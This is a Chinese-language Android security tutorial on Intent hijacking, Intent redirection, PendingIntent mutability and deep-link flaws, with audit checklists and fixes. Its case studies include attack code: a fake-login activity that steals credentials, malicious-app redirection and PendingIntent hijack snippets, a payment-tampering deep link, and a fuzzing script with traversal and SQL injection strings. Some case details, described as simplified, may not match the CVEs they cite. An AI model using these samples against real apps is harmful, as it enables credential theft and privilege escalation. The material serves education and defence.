# 2x01 - Intent 系统安全

Intent 是 Android 中最灵活的通信方式，它不仅可以用于进程间通信，还是组件间解耦的核心。

但从安全角度看，Intent 也是最常见的“输入通道”：

- Action/Data/Extras 都是可控输入
- 目标组件的选择可能由系统匹配决定（隐式 Intent）
- `PendingIntent`/URI grant 会把“身份与权限”一起带过去

## 1. 显式 Intent vs 隐式 Intent

- **显式 Intent**: 明确指定目标组件的类名。通常用于应用内部通信，安全性较高。
- **隐式 Intent**: 只声明想要执行的“动作”（Action）和“数据”（Data），由系统根据 `Intent Filter` 寻找合适的接收者。

### 安全风险：Intent 劫持
如果一个隐式 Intent 发送了敏感数据，而攻击者注册了一个优先级更高的 `Intent Filter`，系统可能会将 Intent 转发给攻击者的应用，导致信息泄露。

常见发生场景：

- `ACTION_VIEW` 打开 URL/文件时带了 token、手机号、定位等 extra
- 自定义 action 没有用 `setPackage()` 约束接收方

防御思路：

- 对敏感跳转尽量使用显式 Intent（固定 component）
- 或最少 `setPackage()` 限制候选集合
- 对返回结果/回调做来源校验（不要仅凭“看起来像”某个包名）

## 2. Intent 重定向 (Intent Redirection)

这是 Android 应用中最常见的漏洞类型之一。

- **场景**: 应用 A 接收一个来自外部的 Intent，并将其作为参数传递给 `startActivity()` 或 `sendBroadcast()`。
- **攻击**: 攻击者构造一个特殊的 Intent，诱导应用 A 去启动一个它本不该访问的私有组件（如 `com.android.settings` 中的敏感界面）。
- **防御**: 
    - 永远不要直接转发外部传入的 Intent。
    - 对目标组件进行白名单校验。
    - 使用 `PendingIntent` 时要格外小心。

更具体的“可操作”防御点：

- 外部输入的 `Intent` 只当作数据载体使用，不要把它原样喂给 `startActivity/sendBroadcast/startService`
- 如果必须转发：显式设置 component，或在转发前清理危险字段（component、flags、clipdata、selector 等）
- 对 URI 做 scheme/host/path 白名单，避免 `file://`、`content://` 被滥用

## 3. PendingIntent 的陷阱

`PendingIntent` 相当于给其他应用发放了一张“通行证”，允许它以**这个应用的身份**去执行某个动作。

- **漏洞模式**: 如果应用 A 创建了一个指向敏感组件的 `PendingIntent` 并传给应用 B，应用 B 可以修改这个 `PendingIntent` 的原始 Intent（如果它是可变的），从而实现提权。
- **现代防御**: Android 12 强制要求指定 `FLAG_IMMUTABLE` 或 `FLAG_MUTABLE`，大大减少了此类漏洞。

### 3.1 典型漏洞模式（审计 checklist）

- `PendingIntent` 指向导出组件或敏感系统组件
- 可变 `PendingIntent`（允许对 extras/action/data 做修改）
- `PendingIntent` 被交给不可信方（通知、三方 SDK、跨应用分享等）

最小化建议：

- 默认 `FLAG_IMMUTABLE`
- 只有确实需要被修改时才用 `FLAG_MUTABLE`
- 对接收方能力做约束（固定 component 或约束 package）

## 4. Deep Link 与 URI 权限（高频真实漏洞点）

### 4.1 Deep Link 的输入面

App 的 `intent-filter`（http/https scheme、自定义 scheme）相当于公开 API。

常见风险：

- 路由参数注入（`/reset?token=...` 等）
- WebView 打开外部 URL（与 WebView 安全强相关）
- 将 URI 直接映射为文件路径/业务对象 id

审计建议：

- 对 scheme/host/path 做白名单
- 对参数做类型与长度限制
- 对“敏感动作”增加二次确认或重新鉴权

### 4.2 `ClipData` 与 URI grant

`Intent` 可以携带 `ClipData`，配合 `FLAG_GRANT_READ_URI_PERMISSION/WRITE` 传播对某个 `content://` URI 的访问能力。

风险点：

- 误把“临时授权”传播给了不该拿到的接收方
- Provider 端 `grantUriPermissions`/path 校验不严导致越权读取

## 5. 与系统服务交互时的关键点

Intent 最终往往会被 AMS/ATMS/WMS 处理。

研究时常见落点：

- exported 检查与权限检查是否一致
- 跨用户启动（`startActivityAsUser`）的校验
- task/栈相关 flags 是否造成 UI 欺骗

## 6. 调试与验证

- 触发 Activity：`adb shell am start -a <action> -d <uri> --es k v`
- 触发 Broadcast：`adb shell am broadcast -a <action> --es k v`
- 查看解析结果：`adb shell cmd package resolve-activity -a <action> -d <uri>`（不同版本支持不同）

验证思路：

- 先证明“外部可达”（exported + 能匹配 intent-filter）
- 再证明“可控输入进入敏感分支”（logcat/调试点）
- 最后证明“越权/信息泄露/身份混淆”

## 7. 真实漏洞案例深度分析

### 7.1 CVE-2020-0096 (StrandHogg 2.0) - 任务栈劫持

**影响版本**：Android 8.0 - 9.0

**漏洞原理**：

攻击者利用 `taskAffinity` 和 `allowTaskReparenting` 属性，在合法应用启动时劫持其任务栈。

**攻击配置**（恶意应用）：
```xml
<activity 
    android:name=".EvilActivity"
    android:taskAffinity="com.legitimate.app"
    android:allowTaskReparenting="true"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
</activity>
```

**攻击流程**：
1. 用户点击合法应用（如银行 App）的图标
2. 系统检查是否有现有任务栈
3. 发现恶意应用的 `EvilActivity` 声明了相同的 `taskAffinity`
4. 系统将 `EvilActivity` "重新归属"到银行 App 的任务栈
5. 用户看到的是恶意界面，但以为是银行 App
6. 用户输入账号密码 → 被窃取

**演示代码**：
```kotlin
// EvilActivity.kt
class EvilActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // 显示伪造的登录界面（看起来像目标应用）
        setContentView(R.layout.fake_login)
        
        loginButton.setOnClickListener {
            val username = usernameInput.text.toString()
            val password = passwordInput.text.toString()
            
            // 窃取凭证
            sendToAttacker(username, password)
            
            // 启动真正的目标应用
            val intent = packageManager.getLaunchIntentForPackage("com.legitimate.app")
            startActivity(intent)
            finish()
        }
    }
}
```

**修复**：
- Android 10+ 限制了 `taskAffinity` 的跨应用使用
- 增强了任务栈的身份校验
- 用户可在多任务界面看到真实的应用名

### 7.2 CVE-2019-2208 - Intent 重定向提权

**场景**：系统设置应用的导出 Activity

**漏洞代码**（简化）：
```java
// Settings.java (导出的 Activity)
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    
    Intent intent = getIntent();
    Intent nextIntent = intent.getParcelableExtra("next_intent");
    
    if (nextIntent != null) {
        // 危险：直接转发外部传入的 Intent
        startActivity(nextIntent);
    }
}
```

**攻击代码**：
```java
// 恶意应用
Intent settingsIntent = new Intent();
settingsIntent.setClassName(
    "com.android.settings",
    "com.android.settings.TrampolineActivity"
);

// 构造指向私有 Activity 的 Intent
Intent evilIntent = new Intent();
evilIntent.setClassName(
    "com.android.settings",
    "com.android.settings.wifi.WifiConfigController"  // 私有组件
);
evilIntent.putExtra("config_key", "wifi_password");

settingsIntent.putExtra("next_intent", evilIntent);

// Settings 以自己的权限启动私有组件
startActivity(settingsIntent);
```

**影响**：
- 访问本应受保护的私有组件
- 读取 WiFi 密码、VPN 配置等敏感信息
- 修改系统设置

**防御**：
```java
// 安全的实现
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    
    Intent intent = getIntent();
    Intent nextIntent = intent.getParcelableExtra("next_intent");
    
    if (nextIntent != null) {
        // 1. 验证目标组件
        ComponentName component = nextIntent.getComponent();
        if (component == null) {
            return;  // 拒绝隐式 Intent
        }
        
        // 2. 白名单检查
        String packageName = component.getPackageName();
        if (!isAllowedPackage(packageName)) {
            return;
        }
        
        // 3. 清理危险字段
        nextIntent.removeExtra("android.intent.extra.INTENT");  // 嵌套 Intent
        nextIntent.setSelector(null);  // 清除 selector
        nextIntent.setClipData(null);  // 清除 ClipData
        
        // 4. 移除危险 flags
        nextIntent.removeFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        nextIntent.removeFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        
        startActivity(nextIntent);
    }
}
```

### 7.3 CVE-2021-0490 - PendingIntent 可变性漏洞

**漏洞原理**：

系统服务创建了一个可变的 `PendingIntent` 并传给不可信应用。

**漏洞代码**：
```java
// SystemService.java
public void scheduleNotification(String packageName) {
    Intent intent = new Intent(ACTION_OPEN_APP);
    intent.setPackage(packageName);
    
    // 危险：创建可变的 PendingIntent
    PendingIntent pendingIntent = PendingIntent.getActivity(
        context,
        0,
        intent,
        PendingIntent.FLAG_UPDATE_CURRENT  // 默认可变！
    );
    
    // 传给通知管理器（可被应用访问）
    Notification notification = new Notification.Builder(context)
        .setContentIntent(pendingIntent)
        .build();
    
    notificationManager.notify(NOTIFICATION_ID, notification);
}
```

**攻击代码**：
```java
// 恶意应用
StatusBarNotification[] notifications = 
    notificationManager.getActiveNotifications();

for (StatusBarNotification sbn : notifications) {
    Notification notification = sbn.getNotification();
    PendingIntent pendingIntent = notification.contentIntent;
    
    if (pendingIntent != null) {
        // 修改 Intent（因为是可变的）
        Intent evilIntent = new Intent();
        evilIntent.setClassName(
            "com.android.settings",
            "com.android.settings.PrivateActivity"
        );
        
        try {
            // 以系统权限启动私有组件
            pendingIntent.send(context, 0, evilIntent);
        } catch (PendingIntent.CanceledException e) {
            e.printStackTrace();
        }
    }
}
```

**修复（Android 12+）**：
```java
// 强制指定 FLAG_IMMUTABLE
PendingIntent pendingIntent = PendingIntent.getActivity(
    context,
    0,
    intent,
    PendingIntent.FLAG_IMMUTABLE  // 不可修改
);
```

### 7.4 CVE-2020-0213 - Deep Link 参数注入

**漏洞场景**：电商应用的订单支付 Deep Link

**漏洞代码**：
```java
// PaymentActivity.java
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    
    Uri data = getIntent().getData();
    if (data != null) {
        // myapp://pay?order_id=12345&amount=100&callback=...
        String orderId = data.getQueryParameter("order_id");
        String amount = data.getQueryParameter("amount");
        String callback = data.getQueryParameter("callback");
        
        // 危险：未验证参数
        processPayment(orderId, Double.parseDouble(amount));
        
        // 更危险：执行回调
        Intent callbackIntent = Intent.parseUri(callback, 0);
        startActivity(callbackIntent);
    }
}
```

**攻击**：
```html
<!-- 恶意网页 -->
<a href="myapp://pay?order_id=12345&amount=0.01&callback=intent%3A%2F%2F%23Intent%3Bcomponent%3Dcom.victim.app%2F.PrivateActivity%3Bend">
    限时优惠！
</a>
```

**结果**：
1. 用户点击链接，支付金额被篡改为 0.01 元
2. `callback` 参数注入恶意 Intent，启动私有组件

**防御**：
```java
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    
    Uri data = getIntent().getData();
    if (data == null) return;
    
    // 1. 验证 scheme 和 host
    if (!"myapp".equals(data.getScheme()) || 
        !"pay".equals(data.getHost())) {
        finish();
        return;
    }
    
    // 2. 验证参数
    String orderId = data.getQueryParameter("order_id");
    String amountStr = data.getQueryParameter("amount");
    
    if (orderId == null || amountStr == null) {
        finish();
        return;
    }
    
    // 3. 从服务器获取真实金额（不信任客户端）
    double realAmount = fetchAmountFromServer(orderId);
    
    // 4. 显示确认界面，让用户二次确认
    showConfirmDialog(orderId, realAmount);
    
    // 5. 不执行外部 callback
    // 支付完成后跳转到应用内的固定页面
}
```

## 8. Intent 安全审计实战

### 8.1 自动化扫描工具

**Drozer - Intent Fuzzing**：
```bash
# 安装 Drozer
pip install drozer

# 枚举导出的 Activity
dz> run app.activity.info -a com.example.app

# 测试 Intent 重定向
dz> run scanner.activity.intentsink -a com.example.app

# 模糊测试 Deep Link
dz> run app.activity.start --component com.example.app/.DeepLinkActivity \
    --data-uri "myapp://test/../../../private"
```

**MobSF - 静态分析**：
```bash
# 扫描 AndroidManifest.xml
python manage.py run_scan -t apk -f app.apk

# 检测项：
# - 导出组件
# - Intent Filter 配置
# - Deep Link scheme
# - PendingIntent 使用
```

### 8.2 手动审计 Checklist

**Step 1: 枚举攻击面**
```bash
# 导出的 Activity
adb shell dumpsys package com.example.app | grep -A 5 "Activity filter"

# Intent Filter 详情
aapt dump xmltree app.apk AndroidManifest.xml | grep -A 10 "intent-filter"
```

**Step 2: 测试 Intent 重定向**
```java
// 测试代码
Intent testIntent = new Intent();
testIntent.setClassName("com.example.app", "com.example.app.ExportedActivity");

Intent evilIntent = new Intent();
evilIntent.setClassName("com.android.settings", "com.android.settings.PrivateActivity");

testIntent.putExtra("redirect", evilIntent);  // 常见参数名
testIntent.putExtra("next", evilIntent);
testIntent.putExtra("forward", evilIntent);
testIntent.putExtra("intent", evilIntent);

startActivity(testIntent);
```

**Step 3: Fuzzing Deep Link**
```python
#!/usr/bin/env python3
import subprocess

schemes = ["http", "https", "myapp", "custom"]
hosts = ["example.com", "localhost", ".."]
paths = [
    "/normal",
    "/../../../data/system",
    "/%2e%2e%2f%2e%2e%2f",
    "/';DROP TABLE users--",
]

for scheme in schemes:
    for host in hosts:
        for path in paths:
            uri = f"{scheme}://{host}{path}?param=test"
            cmd = [
                "adb", "shell", "am", "start",
                "-a", "android.intent.action.VIEW",
                "-d", uri
            ]
            
            result = subprocess.run(cmd, capture_output=True)
            if b"Error" not in result.stderr:
                print(f"[+] 成功: {uri}")
```

**Step 4: 检查 PendingIntent**
```bash
# 查找 PendingIntent 使用
grep -r "PendingIntent\\.get" src/

# 检查是否指定了 FLAG_IMMUTABLE
grep -r "FLAG_IMMUTABLE" src/
```

### 8.3 Frida 动态监控

**监控所有 Intent 操作**：
```javascript
Java.perform(function() {
    // Hook startActivity
    var Activity = Java.use("android.app.Activity");
    Activity.startActivity.overload('android.content.Intent').implementation = function(intent) {
        console.log("\n[Activity] startActivity:");
        logIntent(intent);
        return this.startActivity(intent);
    };
    
    // Hook sendBroadcast
    var ContextImpl = Java.use("android.app.ContextImpl");
    ContextImpl.sendBroadcast.overload('android.content.Intent').implementation = function(intent) {
        console.log("\n[Broadcast] sendBroadcast:");
        logIntent(intent);
        return this.sendBroadcast(intent);
    };
    
    // Hook startService
    ContextImpl.startService.implementation = function(intent) {
        console.log("\n[Service] startService:");
        logIntent(intent);
        return this.startService(intent);
    };
    
    function logIntent(intent) {
        console.log("  Action: " + intent.getAction());
        console.log("  Data: " + intent.getDataString());
        
        var component = intent.getComponent();
        if (component != null) {
            console.log("  Component: " + component.flattenToString());
        }
        
        var extras = intent.getExtras();
        if (extras != null) {
            var keys = extras.keySet().toArray();
            console.log("  Extras:");
            for (var i = 0; i < keys.length; i++) {
                var key = keys[i];
                var value = extras.get(key);
                console.log("    " + key + " = " + value);
                
                // 检测嵌套 Intent
                if (value instanceof Java.use("android.content.Intent")) {
                    console.log("    [!] 发现嵌套 Intent！");
                    logIntent(value);
                }
            }
        }
        
        // 打印调用栈
        console.log(Java.use("android.util.Log").getStackTraceString(
            Java.use("java.lang.Exception").$new()
        ));
    }
});
```

**监控 Deep Link 处理**：
```javascript
// Hook Intent.getData()
Java.perform(function() {
    var Intent = Java.use("android.content.Intent");
    
    Intent.getData.implementation = function() {
        var data = this.getData();
        if (data != null) {
            console.log("[Deep Link] getData: " + data.toString());
            
            // 检测可疑模式
            var dataStr = data.toString();
            if (dataStr.indexOf("..") !== -1 ||
                dataStr.indexOf("file://") !== -1 ||
                dataStr.indexOf("intent://") !== -1) {
                console.log("[!] 可疑的 Deep Link！");
                console.log(Java.use("android.util.Log").getStackTraceString(
                    Java.use("java.lang.Exception").$new()
                ));
            }
        }
        return data;
    };
});
```

### 8.4 常见漏洞模式速查

| 漏洞类型 | 检测特征 | 测试方法 |
|---------|---------|---------|
| **Intent 劫持** | 隐式 Intent 发送敏感数据 | 注册高优先级 receiver |
| **Intent 重定向** | `getParcelableExtra("intent")` | 注入嵌套 Intent |
| **Deep Link 注入** | 参数直接用于逻辑 | Fuzz URL 参数 |
| **PendingIntent 劫持** | 可变 PendingIntent | 尝试修改 Intent |
| **任务栈劫持** | `taskAffinity` 可控 | 声明相同 affinity |
| **URI 授权泄露** | `FLAG_GRANT_*` 过度使用 | 检查授权范围 |

## 9. 安全开发最佳实践

### 9.1 Intent 发送方

```kotlin
// ✅ 安全：显式 Intent
val intent = Intent(this, TargetActivity::class.java)
intent.putExtra("data", sensitiveData)
startActivity(intent)

// ❌ 危险：隐式 Intent 携带敏感数据
val intent = Intent("com.example.ACTION")
intent.putExtra("password", userPassword)  // 可能被劫持！
startActivity(intent)

// ✅ 安全：使用 setPackage 限制接收方
val intent = Intent("com.example.ACTION")
intent.setPackage("com.trusted.app")
startActivity(intent)
```

### 9.2 Intent 接收方

```kotlin
override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    
    val intent = intent
    
    // ❌ 危险：直接转发外部 Intent
    val nextIntent = intent.getParcelableExtra<Intent>("next")
    if (nextIntent != null) {
        startActivity(nextIntent)  // Intent 重定向！
    }
    
    // ✅ 安全：验证后转发
    val nextIntent = intent.getParcelableExtra<Intent>("next")
    if (nextIntent != null && isSafeIntent(nextIntent)) {
        // 清理危险字段
        val safeIntent = Intent(nextIntent)
        safeIntent.selector = null
        safeIntent.clipData = null
        safeIntent.removeFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
        
        startActivity(safeIntent)
    }
}

fun isSafeIntent(intent: Intent): Boolean {
    val component = intent.component ?: return false
    return component.packageName in WHITELIST_PACKAGES
}
```

### 9.3 PendingIntent 创建

```kotlin
// ✅ Android 12+ 安全做法
val intent = Intent(this, TargetActivity::class.java)
val pendingIntent = PendingIntent.getActivity(
    this,
    0,
    intent,
    PendingIntent.FLAG_IMMUTABLE  // 强制不可变
)

// ✅ 需要可变时的安全做法
val pendingIntent = PendingIntent.getActivity(
    this,
    0,
    intent,
    PendingIntent.FLAG_MUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
)
// 同时限制接收方：intent.setPackage("com.trusted.app")
```

### 9.4 Deep Link 处理

```kotlin
override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    
    val data = intent.data ?: return
    
    // 1. 验证 scheme 和 host
    if (data.scheme != "myapp" || data.host != "trusted.host") {
        finish()
        return
    }
    
    // 2. 验证路径白名单
    val allowedPaths = listOf("/profile", "/settings", "/payment")
    if (data.path !in allowedPaths) {
        finish()
        return
    }
    
    // 3. 安全解析参数
    val userId = data.getQueryParameter("user_id")?.toIntOrNull()
    if (userId == null || userId <= 0) {
        finish()
        return
    }
    
    // 4. 服务器二次验证
    verifyFromServer(userId) { isValid ->
        if (isValid) {
            // 执行业务逻辑
        } else {
            finish()
        }
    }
}
```

## 10. 总结

Intent 系统的灵活性使其成为 Android 安全的双刃剑。在审计时：

**高危场景**：
1. 导出组件处理外部 Intent
2. 隐式 Intent 传递敏感数据
3. Deep Link 参数直接用于业务逻辑
4. PendingIntent 传给不可信方
5. Intent 重定向/转发

**核心防御原则**：
- 优先使用显式 Intent
- 永远验证外部输入
- 清理危险字段（component、selector、flags）
- PendingIntent 默认 FLAG_IMMUTABLE
- Deep Link 参数服务器二次验证

## 参考（AOSP）

- **架构概览（AMS/ATMS）**：https://source.android.com/docs/core/architecture
- **应用沙盒（Intent 与文件共享）**：https://source.android.com/docs/security/app-sandbox
- **SELinux（Binder/Intent 的 MAC 约束）**：https://source.android.com/docs/security/features/selinux
